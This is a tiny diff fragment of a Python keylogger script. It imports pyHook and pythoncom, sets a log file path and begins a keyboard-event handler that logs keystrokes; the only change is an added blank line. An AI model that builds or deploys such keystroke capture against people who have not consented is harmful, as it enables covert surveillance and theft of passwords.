@@ -3,6 +3,7 @@
 #Version 1.0
 ################
 import pythoncom, pyHook, sys, logging
+
 LOG_FILENAME = 'path\to\log.out'
 def OnKeyboardEvent(event):
     logging.basicConfig(filename=LOG_FILENAME,
